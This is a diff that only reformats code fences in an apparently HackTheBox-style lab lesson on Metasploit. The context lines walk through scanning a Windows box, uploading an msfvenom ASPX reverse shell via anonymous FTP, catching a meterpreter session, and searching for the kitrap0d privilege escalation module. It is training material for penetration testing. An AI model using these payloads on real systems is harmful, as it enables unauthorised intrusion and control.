@@ -18,8 +18,7 @@ Suppose we are hypothetically allowed to call anything we want from the web serv
 
 #### Scanning the Target
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
 
 <SNIP>
@@ -31,8 +30,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 #### FTP Anonymous Access
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ftp 10.10.10.5
 
 Connected to 10.10.10.5.
@@ -61,8 +59,7 @@ Noticing the aspnet\_client, we realize that the box will be able to run `.aspx`
 
 #### Generating Payload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -72,8 +69,7 @@ Payload size: 341 bytes
 Final size of aspx file: 2819 bytes
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls
 
 Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
@@ -81,8 +77,7 @@ Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.
 
 Subsequently, after verifying the successful creation of the `reverse_shell.aspx` reverse shell, we need to upload it to the FTP service using the `put` command as follows:
 
-```
-        shellsession
+```shellsession
 ftp > put reverse_shell.aspx
 local: reverse_shell.aspx remote: reverse_shell.aspx
 229 Entering Extended Passive Mode (|||47832|)
@@ -96,8 +91,7 @@ Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it 
 
 #### MSF - Setting Up Multi/Handler
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfconsole -q 
 
 msf6 > use multi/handler
@@ -139,8 +133,7 @@ http://10.10.10.5/reverse\_shell.aspx
 
 #### MSF - Meterpreter Shell
 
-```
-        shellsession
+```shellsession
 <...SNIP...>
 [*] Started reverse TCP handler on 10.10.14.5:1337 
 
@@ -166,8 +159,7 @@ As a tip, there is a module called the `Local Exploit Suggester`. We will be usi
 
 #### MSF - Searching for Local Exploit Suggester
 
-```
-        shellsession
+```shellsession
 msf6 > search local exploit suggester
 
 <...SNIP...>
@@ -214,8 +206,7 @@ Having these results in front of us, we can easily pick one of them to test out.
 
 #### MSF - Local Privilege Escalation
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/handler) > search kitrap0d
 
 Matching Modules
